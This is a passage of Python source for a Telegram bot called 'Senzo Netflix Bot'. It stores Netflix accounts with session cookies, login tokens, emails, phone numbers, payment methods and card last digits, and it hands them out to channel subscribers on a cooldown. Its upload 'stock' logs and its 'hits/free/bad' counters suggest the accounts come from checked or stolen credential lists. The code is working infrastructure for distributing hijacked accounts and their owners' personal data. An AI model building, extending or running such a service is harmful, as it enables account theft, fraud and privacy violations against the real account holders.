                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                admin_id INTEGER,
                reason TEXT,
                warning_number INT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )'''
        ]
        with self._turso_lock:
            for stmt in statements:
                try:
                    if self.turso_driver_type == 'client_sync':
                        self.turso_conn.execute(stmt)
                    else:
                        cur = self.turso_conn.cursor()
                        cur.execute(stmt)
                except Exception:
                    pass
            if self.turso_driver_type == 'cursor':
                try:
                    self.turso_conn.commit()
                except Exception:
                    pass
            logger.info("✅ Turso meta tables initialized")
    
    def _init_sqlite_tables(self):
        if not self.sqlite_conn:
            return
        with self._sqlite_lock:
            cur = self.sqlite_conn.cursor()
            cur.execute('''
                CREATE TABLE IF NOT EXISTS accounts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT,
                    country TEXT,
                    plan TEXT,
                    plan_key TEXT,
                    cookies TEXT,
                    nftoken TEXT,
                    nftoken_expiry TEXT,
                    assigned_to INTEGER,
                    assigned_at TIMESTAMP,
                    is_working BOOLEAN DEFAULT 1,
                    status TEXT DEFAULT 'available',
                    source_file TEXT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_checked TIMESTAMP,
                    report_count INT DEFAULT 0,
                    account_name TEXT,
                    streams INT,
                    quality TEXT,
                    price TEXT,
                    billing_date TEXT,
                    member_since TEXT,
                    payment_method TEXT,
                    card_last4 TEXT,
                    phone TEXT,
                    extra_member BOOLEAN DEFAULT 0,
                    membership_status TEXT,
                    email_verified BOOLEAN DEFAULT 0,
                    profiles TEXT,
                    user_guid TEXT,
                    working_confirmed BOOLEAN DEFAULT 0,
                    on_hold BOOLEAN DEFAULT 0
                )
            ''')
            cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_status ON accounts(status, is_working)')
            cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_assigned ON accounts(assigned_to)')
            cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_email ON accounts(email)')
            cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_plan ON accounts(plan_key)')
            self.sqlite_conn.commit()
            logger.info("✅ SQLite accounts table initialized")
            if not self.use_turso:
                self._init_sqlite_meta_tables()
    
    def _init_sqlite_meta_tables(self):
        if not self.sqlite_conn:
            return
        with self._sqlite_lock:
            cur = self.sqlite_conn.cursor()
            cur.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    is_banned BOOLEAN DEFAULT 0,
                    is_admin BOOLEAN DEFAULT 0,
                    last_account_time TIMESTAMP,
                    total_working INT DEFAULT 0,
                    total_notworking INT DEFAULT 0,
                    working_reports INT DEFAULT 0,
                    notworking_reports INT DEFAULT 0,
                    accounts_used INT DEFAULT 0,
                    pending_report BOOLEAN DEFAULT 0,
                    pending_report_account_id INTEGER,
                    pending_report_type TEXT,
                    warnings INT DEFAULT 0
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS reports (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    account_id INTEGER,
                    report_type TEXT,
                    screenshot_file_id TEXT,
                    status TEXT DEFAULT 'pending',
                    reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    reviewed_at TIMESTAMP,
                    admin_note TEXT,
                    admin_id INTEGER,
                    channel_post_id INTEGER
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    message TEXT,
                    admin_reply TEXT,
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    replied_at TIMESTAMP
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS channels (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    channel_id TEXT UNIQUE,
                    channel_name TEXT,
                    invite_link TEXT,
                    is_active BOOLEAN DEFAULT 1
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS stock_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    admin_id INTEGER,
                    file_name TEXT,
                    total_found INT,
                    valid_found INT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS stats (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    date DATE UNIQUE,
                    total_hits INT DEFAULT 0,
                    total_free INT DEFAULT 0,
                    total_bad INT DEFAULT 0
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS ban_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    admin_id INTEGER,
                    reason TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cur.execute('''
                CREATE TABLE IF NOT EXISTS warning_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    admin_id INTEGER,
                    reason TEXT,
                    warning_number INT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            self.sqlite_conn.commit()
            logger.info("✅ SQLite meta tables initialized")
    
    @retry_on_failure(max_retries=3, delay=1.0)
    def execute_turso(self, query: str, params: Optional[tuple] = None) -> Any:
        if not self.turso_conn:
            raise RuntimeError("Turso connection not available")
        with self._turso_lock:
            if self.turso_driver_type == 'client_sync':
                res = self.turso_conn.execute(query, list(params) if params else [])
                return TursoCursorWrapper(res)
            else:
                cur = self.turso_conn.cursor()
                if params:
                    cur.execute(query, params)
                else:
                    cur.execute(query)
                return cur
    
    @retry_on_failure(max_retries=3, delay=1.0)
    def execute_sqlite(self, query: str, params: Optional[tuple] = None) -> Any:
        if not self.sqlite_conn:
            raise RuntimeError("SQLite connection not available")
        with self._sqlite_lock:
            cur = self.sqlite_conn.cursor()
            if params:
                cur.execute(query, params)
            else:
                cur.execute(query)
            return cur
    
    def commit_turso(self):
        if self.turso_conn and self.turso_driver_type == 'cursor':
            with self._turso_lock:
                try:
                    self.turso_conn.commit()
                except Exception:
                    pass
    
    def commit_sqlite(self):
        if self.sqlite_conn:
            with self._sqlite_lock:
                self.sqlite_conn.commit()

    def execute_meta(self, query: str, params: Optional[tuple] = None) -> Any:
        if self.use_turso:
            return self.execute_turso(query, params)
        return self.execute_sqlite(query, params)

    def commit_meta(self):
        if self.use_turso:
            self.commit_turso()
        else:
            self.commit_sqlite()

    def meta_backend(self) -> str:
        return "Turso" if self.use_turso else "SQLite"

# ============================================================
# FLASK APP & HEALTH ENDPOINT
# ============================================================

flask_app = Flask(__name__)
db = DatabaseManager()

@flask_app.route("/")
@flask_app.route("/health")
def health_check():
    try:
        db_status = "Unknown"
        try:
            if db is not None:
                db_status = db.meta_backend()
            else:
                db_status = "Not Loaded"
        except Exception as e:
            db_status = f"DB Error: {str(e)[:20]}"
        
        bot_configured = bool(BOT_TOKEN)
        
        return jsonify({
            "status": "online",
            "service": "Senzo Netflix Bot",
            "version": "9.0.0",
            "bot_token_configured": bot_configured,
            "accounts_db": DATABASE_PATH,
            "database": db_status,
            "developer": "@Senzo268",
            "timestamp": datetime.utcnow().isoformat()
        }), 200
    except Exception as e:
        return jsonify({
            "status": "online",
            "service": "Senzo Netflix Bot",
            "version": "9.0.0",
            "error": str(e)[:50],
            "timestamp": datetime.utcnow().isoformat()
        }), 200

def start_health_server():
    try:
        logging.getLogger('werkzeug').setLevel(logging.ERROR)
        flask_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"Health server error: {e}")

# ============================================================
# DATA CLASSES
# ============================================================

@dataclass
class User:
    user_id: int
    username: str = ""
    first_name: str = ""
    joined_at: str = ""
    is_banned: bool = False
    is_admin: bool = False
    last_account_time: str = ""
    total_working: int = 0
    total_notworking: int = 0
    working_reports: int = 0
    notworking_reports: int = 0
    accounts_used: int = 0
    pending_report: bool = False
    pending_report_account_id: int = 0
    pending_report_type: str = ""
    warnings: int = 0

@dataclass
class Account:
    id: int = 0
    email: str = ""
    country: str = ""
    plan: str = ""
    plan_key: str = ""
    cookies: str = ""
    nftoken: str = ""
    nftoken_expiry: str = ""
    assigned_to: int = 0
    assigned_at: str = ""
    is_working: bool = True
    status: str = "available"
    account_name: str = ""
    streams: int = 0
    quality: str = ""
    price: str = ""
    billing_date: str = ""
    profiles: str = ""
    user_guid: str = ""
    phone: str = ""
    extra_member: bool = False
    membership_status: str = ""
    on_hold: bool = False

# ============================================================
# REPOSITORY LAYER
# ============================================================

class DuplicateTracker:
    def __init__(self):
        self.processed = set()
        self.lock = threading.Lock()
    
    def is_duplicate(self, email: str) -> bool:
        if not email:
            return False
        with self.lock:
            if email in self.processed:
                return True
            self.processed.add(email)
            return False
    
    def reset(self):
        with self.lock:
            self.processed.clear()

class UserRepository:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get(self, user_id: int) -> User:
        try:
            cur = self.db.execute_meta('SELECT * FROM users WHERE user_id = ?', (user_id,))
            row = cur.fetchone()
            if row:
                return User(
                    user_id=row[0], username=safe_str(row[1]), first_name=safe_str(row[2]),
                    joined_at=safe_str(row[3]), is_banned=safe_bool(row[4]), is_admin=safe_bool(row[5]),
                    last_account_time=safe_str(row[6]), total_working=safe_int(row[7]),
                    total_notworking=safe_int(row[8]), working_reports=safe_int(row[9]),
                    notworking_reports=safe_int(row[10]), accounts_used=safe_int(row[11]),
                    pending_report=safe_bool(row[12]), pending_report_account_id=safe_int(row[13]),
                    pending_report_type=safe_str(row[14]), warnings=safe_int(row[15])
                )
        except Exception:
            pass
        return User(user_id=user_id)
    
    def create_or_update(self, user_id: int, username: str = "", first_name: str = "") -> bool:
        try:
            is_admin_flag = 1 if user_id in ADMIN_IDS else 0
            self.db.execute_meta('''
                INSERT OR REPLACE INTO users 
                (user_id, username, first_name, is_admin, pending_report, warnings)
                VALUES (?, ?, ?, ?, 0, 0)
            ''', (user_id, safe_str(username), safe_str(first_name), is_admin_flag))
            self.db.commit_meta()
            return True
        except Exception:
            return False
    
    def get_all(self) -> List[User]:
        try:
            cur = self.db.execute_meta('''
                SELECT user_id, username, first_name, is_banned, warnings, accounts_used 
                FROM users ORDER BY joined_at DESC
            ''')
            rows = cur.fetchall()
            return [
                User(
                    user_id=r[0], username=safe_str(r[1]), first_name=safe_str(r[2]),
                    is_banned=safe_bool(r[3]), warnings=safe_int(r[4]), accounts_used=safe_int(r[5])
                )
                for r in rows
            ]
        except Exception:
            return []
    
    def get_banned(self) -> List[Tuple]:
        try:
            cur = self.db.execute_meta('SELECT user_id, username, first_name FROM users WHERE is_banned = 1')
            return cur.fetchall()
        except Exception:
            return []
    
    def ban(self, user_id: int, admin_id: int, reason: str) -> bool:
        try:
            self.db.execute_meta('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
            self.db.execute_meta('INSERT INTO ban_logs (user_id, admin_id, reason) VALUES (?, ?, ?)', (user_id, admin_id, reason))
            self.db.commit_meta()
            return True
        except Exception:
            return False
    
    def unban(self, user_id: int) -> bool:
        try:
            self.db.execute_meta('UPDATE users SET is_banned = 0, warnings = 0 WHERE user_id = ?', (user_id,))
            self.db.commit_meta()
            return True
        except Exception:
            return False
    
    def add_warning(self, user_id: int, admin_id: int, reason: str) -> int:
        try:
            cur = self.db.execute_meta('SELECT warnings FROM users WHERE user_id = ?', (user_id,))
            row = cur.fetchone()
            warnings = (row[0] if row else 0) + 1
            self.db.execute_meta('UPDATE users SET warnings = ? WHERE user_id = ?', (warnings, user_id))
            self.db.execute_meta('''
                INSERT INTO warning_logs (user_id, admin_id, reason, warning_number)
                VALUES (?, ?, ?, ?)
            ''', (user_id, admin_id, reason, warnings))
            self.db.commit_meta()
            if warnings >= 3:
                self.ban(user_id, admin_id, "3 warnings - Auto ban")
            return warnings
        except Exception:
            return 0
    
    def update_cooldown(self, user_id: int) -> bool:
        try:
            self.db.execute_meta('''
                UPDATE users 
                SET last_account_time = CURRENT_TIMESTAMP, accounts_used = accounts_used + 1
                WHERE user_id = ?
            ''', (user_id,))
            self.db.commit_meta()
            return True
        except Exception:
            return False
    
    def find_by_query(self, query: str) -> Optional[User]:
        try:
            q = query.strip().lstrip('@')
            if q.isdigit():
                return self.get(int(q))
            cur = self.db.execute_meta('SELECT user_id FROM users WHERE LOWER(username) = LOWER(?)', (q,))
            row = cur.fetchone()
            if row:
                return self.get(row[0])
        except Exception:
            pass
        return None

class AccountRepository:
    def __init__(self, db: DatabaseManager, duplicate_tracker: DuplicateTracker):
        self.db = db
        self.duplicate_tracker = duplicate_tracker
    
    def get_by_id(self, account_id: int) -> Optional[Account]:
        try:
            cur = self.db.execute_sqlite('''
                SELECT id, email, country, plan, plan_key, cookies, nftoken, nftoken_expiry, status,
                       account_name, streams, quality, price, billing_date, profiles,
                       user_guid, phone, extra_member, membership_status, on_hold
                FROM accounts WHERE id = ?
            ''', (account_id,))
            row = cur.fetchone()
            if row:
                return Account(
                    id=row[0], email=safe_str(row[1]), country=safe_str(row[2]), plan=safe_str(row[3]),
                    plan_key=safe_str(row[4]), cookies=safe_str(row[5]), nftoken=safe_str(row[6]),
                    nftoken_expiry=safe_str(row[7]), status=safe_str(row[8]),
                    account_name=safe_str(row[9]), streams=safe_int(row[10]), quality=safe_str(row[11]),
                    price=safe_str(row[12]), billing_date=safe_str(row[13]), profiles=safe_str(row[14]),
                    user_guid=safe_str(row[15]), phone=safe_str(row[16]), extra_member=safe_bool(row[17]),
                    membership_status=safe_str(row[18]), on_hold=safe_bool(row[19])
                )
        except Exception:
            pass
        return None

    def get_available(self, plan_filter: Optional[str] = None) -> List[Account]:
        try:
            if plan_filter:
                cur = self.db.execute_sqlite('''
                    SELECT id, email, country, plan, plan_key, cookies, nftoken, nftoken_expiry, status,
                           account_name, streams, quality, price, billing_date, profiles,
                           user_guid, phone, extra_member, membership_status, on_hold
                    FROM accounts 
                    WHERE status = 'available' AND is_working = 1 AND plan_key = ? 
                    ORDER BY id ASC
                ''', (plan_filter,))
            else:
                cur = self.db.execute_sqlite('''
                    SELECT id, email, country, plan, plan_key, cookies, nftoken, nftoken_expiry, status,
                           account_name, streams, quality, price, billing_date, profiles,
                           user_guid, phone, extra_member, membership_status, on_hold
                    FROM accounts 
                    WHERE status = 'available' AND is_working = 1 
                    ORDER BY id ASC
                ''')
            rows = cur.fetchall()
            return [
                Account(
                    id=r[0], email=safe_str(r[1]), country=safe_str(r[2]), plan=safe_str(r[3]),
                    plan_key=safe_str(r[4]), cookies=safe_str(r[5]), nftoken=safe_str(r[6]),
                    nftoken_expiry=safe_str(r[7]), status=safe_str(r[8]),
                    account_name=safe_str(r[9]), streams=safe_int(r[10]), quality=safe_str(r[11]),
                    price=safe_str(r[12]), billing_date=safe_str(r[13]), profiles=safe_str(r[14]),
                    user_guid=safe_str(r[15]), phone=safe_str(r[16]), extra_member=safe_bool(r[17]),
                    membership_status=safe_str(r[18]), on_hold=safe_bool(r[19])
                )
                for r in rows
            ]
        except Exception:
            return []
    
    def get_total(self) -> Dict[str, Union[int, Dict]]:
        try:
            cur = self.db.execute_sqlite('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
            total = cur.fetchone()[0] or 0
            cur = self.db.execute_sqlite('''
                SELECT plan_key, COUNT(*) FROM accounts 
                WHERE status = 'available' AND is_working = 1 
                GROUP BY plan_key
            ''')
            plan_counts = {safe_str(r[0]): safe_int(r[1]) for r in cur.fetchall()}
            return {"total": total, "plans": plan_counts}
        except Exception:
            return {"total": 0, "plans": {}}
    
    def assign(self, user_id: int) -> Optional[Account]:
        try:
            accounts = self.get_available()
            if not accounts:
                return None
            account = accounts[0]
            self.db.execute_sqlite('''
                UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = 'available' 
                WHERE assigned_to = ?
            ''', (user_id,))
            cur = self.db.execute_sqlite('''
                UPDATE accounts 
                SET assigned_to = ?, assigned_at = CURRENT_TIMESTAMP, status = 'assigned' 
                WHERE id = ? AND status = 'available'
            ''', (user_id, account.id))
            if cur.rowcount > 0:
                self.db.commit_sqlite()
                user_repo = UserRepository(self.db)
                user_repo.update_cooldown(user_id)
                return account
            self.db.commit_sqlite()
            return None
        except Exception:
            return None
    
    def get_assigned(self, user_id: int) -> Optional[Account]:
        try:
            cur = self.db.execute_sqlite('''
                SELECT id, email, country, plan, plan_key, cookies, nftoken, nftoken_expiry,
                       account_name, streams, quality, price, billing_date, profiles,
                       user_guid, phone, extra_member, membership_status, on_hold
                FROM accounts 
                WHERE assigned_to = ? AND status = 'assigned' 
                ORDER BY assigned_at DESC LIMIT 1
            ''', (user_id,))
            row = cur.fetchone()
            if row:
                return Account(
                    id=row[0], email=safe_str(row[1]), country=safe_str(row[2]), plan=safe_str(row[3]),
                    plan_key=safe_str(row[4]), cookies=safe_str(row[5]), nftoken=safe_str(row[6]),
                    nftoken_expiry=safe_str(row[7]), account_name=safe_str(row[8]),
                    streams=safe_int(row[9]), quality=safe_str(row[10]), price=safe_str(row[11]),
                    billing_date=safe_str(row[12]), profiles=safe_str(row[13]),
                    user_guid=safe_str(row[14]), phone=safe_str(row[15]), extra_member=safe_bool(row[16]),
                    membership_status=safe_str(row[17]), on_hold=safe_bool(row[18])
                )
        except Exception:
            pass
        return None
    
    def release(self, account_id: int) -> bool:
        try:
            self.db.execute_sqlite('''
                UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = 'available' 
                WHERE id = ?
            ''', (account_id,))
            self.db.commit_sqlite()
            return True
        except Exception:
            return False
    
    def delete(self, account_id: int) -> bool:
        try:
            self.db.execute_sqlite('DELETE FROM accounts WHERE id = ?', (account_id,))
            self.db.commit_sqlite()
            return True
        except Exception:
            return False
    
    def clear_all(self, plan_filter: Optional[str] = None) -> int:
        try:
            if plan_filter:
                cur = self.db.execute_sqlite('DELETE FROM accounts WHERE plan_key = ?', (plan_filter,))
            else:
                cur = self.db.execute_sqlite('DELETE FROM accounts')
            self.db.commit_sqlite()
            return cur.rowcount
        except Exception:
            return 0
    
    def save_account(self, account_data: Dict) -> bool:
        try:
            email = account_data.get("email")
            if email and self.duplicate_tracker.is_duplicate(email):
                logger.info(f"⏭️ Skipping duplicate: {email}")
                return False
            
            cookies_value = account_data.get("cookies", "")
            if isinstance(cookies_value, dict):
                cookies_value = NetflixService.get_cookie_text(cookies_value)
            
            self.db.execute_sqlite('''
                INSERT INTO accounts (
                    email, country, plan, plan_key, cookies, nftoken, nftoken_expiry,
                    source_file, last_checked, account_name, streams, quality,
                    price, billing_date, member_since, payment_method, card_last4,
                    phone, extra_member, membership_status, email_verified,
                    profiles, user_guid, working_confirmed, status, is_working, on_hold
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 'available', 1, ?)
            ''', (
                safe_str(account_data.get("email")),
                safe_str(account_data.get("country")),
                safe_str(account_data.get("plan_label", account_data.get("plan", "Unknown"))),
                safe_str(account_data.get("plan_key", "unknown")),
                safe_str(cookies_value),
                safe_str(account_data.get("nftoken")),
                safe_str(account_data.get("nftoken_expiry")),
                safe_str(account_data.get("source_file", "unknown")),
                get_timestamp(),
                safe_str(account_data.get("account_name")),
                safe_int(account_data.get("streams")),
                safe_str(account_data.get("quality")),
                safe_str(account_data.get("price")),
                safe_str(account_data.get("billing_date")),
                safe_str(account_data.get("member_since")),
                safe_str(account_data.get("payment_method")),
                safe_str(account_data.get("card_last4")),
                safe_str(account_data.get("phone")),
                1 if safe_bool(account_data.get("extra_member")) else 0,
                safe_str(account_data.get("membership_status")),
                1 if safe_bool(account_data.get("email_verified")) else 0,
                safe_str(account_data.get("profiles")),
                safe_str(account_data.get("user_guid")),
                1 if safe_bool(account_data.get("on_hold")) else 0,
            ))
            self.db.commit_sqlite()
            return True
        except Exception as e:
            logger.error(f"save_account error: {e}")
            return False
    
    def save_batch(self, accounts: List[Dict]) -> int:
        if not accounts:
            return 0
        saved = 0
        for account in accounts:
            if self.save_account(account):
                saved += 1
        logger.info(f"✅ Saved {saved}/{len(accounts)} accounts")
        return saved

class ReportRepository:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def create(self, user_id: int, account_id: int, report_type: str, screenshot_file_id: str) -> int:
        try:
            cur = self.db.execute_meta('''
                INSERT INTO reports (user_id, account_id, report_type, screenshot_file_id)
                VALUES (?, ?, ?, ?)
            ''', (user_id, account_id, report_type, screenshot_file_id))
            report_id = cur.lastrowid
            
            if report_type == "working":
                self.db.execute_meta('UPDATE users SET working_reports = working_reports + 1 WHERE user_id = ?', (user_id,))
            else:
                self.db.execute_meta('UPDATE users SET notworking_reports = notworking_reports + 1 WHERE user_id = ?', (user_id,))
            
            self.db.execute_meta('''
                UPDATE users 
                SET pending_report = 0, pending_report_account_id = NULL, pending_report_type = NULL
                WHERE user_id = ?
            ''', (user_id,))
            self.db.commit_meta()
            return report_id
        except Exception:
            return 0
    
    def get_pending(self) -> List[Dict]:
        try:
            cur = self.db.execute_meta('''
                SELECT r.id, r.user_id, r.account_id, r.report_type, 
                       r.screenshot_file_id, r.reported_at, u.username
                FROM reports r
                LEFT JOIN users u ON r.user_id = u.user_id
                WHERE r.status = 'pending' 
                ORDER BY r.id DESC
            ''')
            rows = cur.fetchall()
            return [
                {
                    "id": r[0], "user_id": r[1], "account_id": r[2],
                    "report_type": safe_str(r[3]), "screenshot": safe_str(r[4]),
                    "time": safe_str(r[5]), "username": safe_str(r[6]), "email": ""
                }
                for r in rows
            ]
        except Exception:
            return []
    
    def update_status(self, report_id: int, status: str, admin_id: int) -> bool:
        try:
            self.db.execute_meta('''
                UPDATE reports SET status = ?, reviewed_at = CURRENT_TIMESTAMP, admin_id = ? 
                WHERE id = ?
            ''', (status, admin_id, report_id))
            self.db.commit_meta()
            return True
        except Exception:
            return False
    
    def get_by_id(self, report_id: int) -> Optional[Dict]:
        try:
            cur = self.db.execute_meta('''
                SELECT id, user_id, account_id, report_type, screenshot_file_id,
                       status, reported_at, reviewed_at, admin_id, channel_post_id
                FROM reports WHERE id = ?
            ''', (report_id,))
            row = cur.fetchone()
            if row:
                return {
                    "id": row[0], "user_id": row[1], "account_id": row[2],
                    "report_type": row[3], "screenshot_file_id": row[4],
                    "status": row[5], "reported_at": row[6], "reviewed_at": row[7],
                    "admin_id": row[8], "channel_post_id": row[9]
                }
        except Exception:
            pass
        return None

class ChannelRepository:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_active(self) -> List[Tuple]:
        try:
            cur = self.db.execute_meta('SELECT channel_id, channel_name, invite_link FROM channels WHERE is_active = 1')
            return cur.fetchall()
        except Exception:
            return []
    
    def add(self, channel_id: str, channel_name: str, invite_link: str) -> bool:
        try:
            self.db.execute_meta('''
                INSERT OR REPLACE INTO channels (channel_id, channel_name, invite_link) 
                VALUES (?, ?, ?)
            ''', (channel_id, channel_name, invite_link))
            self.db.commit_meta()
            return True
        except Exception:
            return False
    
    def remove(self, channel_id: int) -> bool:
        try:
            self.db.execute_meta('DELETE FROM channels WHERE id = ?', (channel_id,))
            self.db.commit_meta()
            return True
        except Exception:
            return False

class StatsRepository:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def log_stock(self, admin_id: int, file_name: str, total: int, valid: int) -> bool:
        try:
            self.db.execute_meta('''
                INSERT INTO stock_logs (admin_id, file_name, total_found, valid_found) 
                VALUES (?, ?, ?, ?)
            ''', (admin_id, file_name, total, valid))
            self.db.commit_meta()
            return True
        except Exception:
            return False
    
    def get_stock_logs(self, limit: int = 20) -> List[Dict]:
        try:
            cur = self.db.execute_meta('''
                SELECT id, admin_id, file_name, total_found, valid_found, uploaded_at 
                FROM stock_logs ORDER BY id DESC LIMIT ?
            ''', (limit,))
            rows = cur.fetchall()
            return [
                {
                    "id": r[0], "admin_id": r[1], "file_name": safe_str(r[2]),
                    "total": safe_int(r[3]), "valid": safe_int(r[4]), "time": safe_str(r[5])
                }
                for r in rows
            ]
        except Exception:
            return []
    
    def log_daily(self, hits: int = 0, free: int = 0, bad: int = 0) -> bool:
        try:
            cur = self.db.execute_meta('SELECT id FROM stats WHERE date = CURRENT_DATE')
            row = cur.fetchone()
            if row:
                self.db.execute_meta('''
                    UPDATE stats 
                    SET total_hits = total_hits + ?, total_free = total_free + ?, total_bad = total_bad + ?
                    WHERE date = CURRENT_DATE
                ''', (hits, free, bad))
            else:
                self.db.execute_meta('''
                    INSERT INTO stats (date, total_hits, total_free, total_bad)
                    VALUES (CURRENT_DATE, ?, ?, ?)
                ''', (hits, free, bad))
            self.db.commit_meta()
            return True
        except Exception:
            return False
    
    def get_today(self) -> Dict[str, int]:
        try:
            cur = self.db.execute_meta('SELECT total_hits, total_free, total_bad FROM stats WHERE date = CURRENT_DATE')
            row = cur.fetchone()
            if row:
                return {"hits": row[0] or 0, "free": row[1] or 0, "bad": row[2] or 0}
        except Exception:
            pass
        return {"hits": 0, "free": 0, "bad": 0}

# ============================================================
# BOT HANDLERS
# ============================================================

class BotHandlers:
    def __init__(self):
        self.db = db
        self.duplicate_tracker = DuplicateTracker()
        self.user_repo = UserRepository(self.db)
        self.account_repo = AccountRepository(self.db, self.duplicate_tracker)
        self.report_repo = ReportRepository(self.db)
        self.channel_repo = ChannelRepository(self.db)
        self.stats_repo = StatsRepository(self.db)
    
    async def _send_message(self, update: Update, text: str, reply_markup=None, parse_mode=ParseMode.HTML):
        try:
            if update.callback_query:
                query = update.callback_query
                try:
                    await query.answer()
                except Exception:
                    pass
                try:
                    return await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
                except Exception as e:
                    if "Message is not modified" in str(e):
                        return query.message
                    if query.message:
                        return await query.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
            elif update.message:
                return await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception:
            pass
        return None
    
    async def _check_force_sub(self, bot, user_id: int):
        try:
            channels = self.channel_repo.get_active()
            if not channels:
                return True, []
            missing_buttons = []
            for ch_id, ch_name, ch_link in channels:
                try:
                    member = await bot.get_chat_member(chat_id=ch_id, user_id=user_id)
                    if member.status not in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]:
                        missing_buttons.append(InlineKeyboardButton(f"📢 Join {ch_name}", url=ch_link))
                except Exception:
                    pass
            if missing_buttons:
                return False, missing_buttons
            return True, []
        except Exception:
            return True, []
    
    def _can_get_account(self, user: User) -> Tuple[bool, str]:
        if user.is_banned:
            return False, "🚫 You are banned from using this bot."
        if user.last_account_time:
            try:
                time_str = str(user.last_account_time).split('.')[0].replace('T', ' ')
                last_dt = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
                diff = datetime.utcnow() - last_dt
                cooldown_seconds = WORKING_COOLDOWN_MINUTES * 60
                if diff.total_seconds() < cooldown_seconds:
                    remaining = int((cooldown_seconds - diff.total_seconds()) / 60) + 1
                    return False, f"⏳ Cooldown active! Please wait {remaining} minute(s)."
            except Exception:
                pass
        if user.accounts_used >= MAX_ACCOUNTS_PER_USER and not is_admin(user.user_id):
            return False, f"⚠️ Account limit reached! Max {MAX_ACCOUNTS_PER_USER} accounts."
        return True, ""
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            user = update.effective_user
            user_id = user.id
            self.user_repo.create_or_update(user_id, user.username, user.first_name)
            user_data = self.user_repo.get(user_id)
            
            if user_data.is_banned:
                await self._send_message(update, "🚫 You are banned from using this bot.")
                return
            
            subbed, ch_buttons = await self._check_force_sub(context.bot, user_id)
            if not subbed:
                keyboard = [[btn] for btn in ch_buttons]
                keyboard.append([InlineKeyboardButton("✅ I Have Joined", callback_data="back_menu")])
                await self._send_message(
                    update,
                    "⚠️ <b>Must Join Channel(s)</b>\n\nPlease join our required channels to use this bot!",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                return
            
            if user_data.pending_report:
                await self._send_message(
                    update,
                    "⚠️ <b>You have a pending report!</b>\n\nPlease upload a screenshot proof.\n\n👨‍💻 <b>Developer:</b> @Senzo268"
                )
                return
            
            stats = self.account_repo.get_total()
            plan_display = ""
            for plan, count in stats.get('plans', {}).items():
                emoji = {"premium": "👑", "standard": "⭐", "basic": "🎯", "mobile": "📱", "free": "🆓"}.get(plan.lower(), "📦")
                plan_display += f"│ {emoji} {html_escape(plan)}: <b>{count}</b>\n"
            if not plan_display:
                plan_display = "│ No accounts available\n"
            
            assigned = self.account_repo.get_assigned(user_id)
            
            keyboard = [
                [InlineKeyboardButton("🎯 Get Account", callback_data="get_account")],
            ]
            if assigned:
                keyboard.append([
                    InlineKeyboardButton("✅ Working", callback_data="working"),
                    InlineKeyboardButton("❌ Not Working", callback_data="notworking"),
                ])
            keyboard.append([
                InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
                InlineKeyboardButton("📊 My Status", callback_data="my_status"),
            ])
            if is_admin(user_id):
                keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
            
            text = f"""🌟 <b>WELCOME TO SENZO NETFLIX BOT</b> 🌟
━━━━━━━━━━━━━━━━━━━━━
👋 Hello <b>{html_escape(user.first_name)}</b>!
━━━━━━━━━━━━━━━━━━━━━
📊 <b>ACCOUNT STOCK</b>
┌─────────────────────
